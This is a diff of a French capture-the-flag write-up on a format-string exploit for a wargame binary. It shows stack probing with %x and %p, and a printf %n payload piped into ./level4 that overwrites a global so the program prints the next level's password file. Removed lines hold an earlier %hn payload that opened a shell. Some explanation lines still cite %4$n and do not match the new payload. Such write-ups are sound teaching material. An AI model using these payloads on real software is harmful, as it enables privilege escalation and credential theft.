@@ -1,73 +1,48 @@
 ### Level3
 
-Code assembleur de de la fonction v() appelé par main :
+Code assembleur de de la fonction n() appelé par main :
 
     ...
-    0x080484d5 <+49>:	call   0x8048390 <printf@plt>
-    0x080484da <+54>:	mov    0x804988c,%eax
-    0x080484df <+59>:	cmp    $0x40,%eax
+   0x08048488 <+49>:	call   0x8048444 <p>
+   0x0804848d <+54>:	mov    0x8049810,%eax
+   0x08048492 <+59>:	cmp    $0x1025544,%eax
     ...
 
-Le contenu de l'adresse 0x804988c est copié dans le registre eax.
-Le registre eax est ensuite comparé à la valeur 64. Si elle est égale, alors cela nous lance un shell avec execve("/bin/sh").
+Le contenu de l'adresse 0x8049810 est copié dans le registre eax.
+Le registre eax est ensuite comparé à la valeur 0x01025544. Si elle est égale, alors cela nous lance la commande /bin/cat /home/user/level5/.pass.
 
 Notre porte d'entrée ce trouve dans le printf qui n'est pas protégée.
 On va pouvoir injecté du code à partir du fgets. Il sera ensuite traité par printf.
 
 Etape pour trouver la position de notre valeur AAAA dans la stack :
 
-    ./level3
+    ./level4
     AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
     AAAA00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e.30252e78.252e7838.2e783830
 
-Il s'avère que l'adresse se situe à la 4ème position dans la stack :
+Il s'avère que l'adresse se situe à la 12ème position dans la stack :
 
-    ./level3
-    AAAA%4$p
+    ./level4
+    AAAA%12$p
     AAAA0x41414141
+
+Valeur hexa a ecrire 0x01025544 a l'adresse 0x08049810, soit 16930116 en decimal
 
 Shellcode finale :
 
-    \x10\x98\x04\x08%60x%2$n 
-    \x12\x98\x04\x08\x10\x98\x04\x08%250x%2$hn%21570x%1$hn
+    \x10\x98\x04\x08%16930112d%12$n
 
 
-- \x8c\x98\x04\x08 : 
-Ceci est l'adresse formatté 0x804988c, dont on veux changer la valeur.
-- %60x : 
-Correspond à la valeur 64 qu'on veut écrire à l'adresse 0x804988c. On enleve 4 car la taille de l'adresse compte déjà dans la valeur finale écrite à cette mëme adresse.
+- \x10\x98\x04\x08 : 
+Ceci est l'adresse formatté 0x08049810, dont on veux changer la valeur.
+- %16930112d : 
+Correspond à la valeur 0x01025544 en decimal qu'on veut écrire à l'adresse 0x08049810. On enleve 4 car la taille de l'adresse compte déjà dans la valeur finale écrite à cette mëme adresse.
 - %4$n : 
 %n de printf permet d'écrire de la data à l'ènième adresse indiqué par '<valeur>$'
 
 Procédure finale :
 
-    run < <(python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08%47798x%1$hn%4160x%2$hn"')
-
-    python -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08%21820x%1$hn%250x%2$hn"' > /tmp/inject
+    python -c 'print "\x10\x98\x04\x08%16930112d%12$n"' > /tmp/inject
     cat /tmp/inject - | ./level4
 
-On obtient le shell avec les permissions utilisateur du fichier. On peut maintenant aller sur le profil du level4.
-
-Adresse ou on veut ecrire : 
-- Low order : 0x08049810
-- High order : 0x08049812
-
-
-Adresse a ecrire : 0x01025544
-- Low order : 5544
-- High order : 0102
-
-Operation :
-
-5544 en hexadécimal équivaut à 21828 en décimal
-0102 en hexadécimal équivaut à 258 en décimal
-
-Ecriture :
-
-21828 - 8 = 21820
-258 - 8 = 250
-
-b *p+12
-b *n+54
-
-
+On obtient le flag.
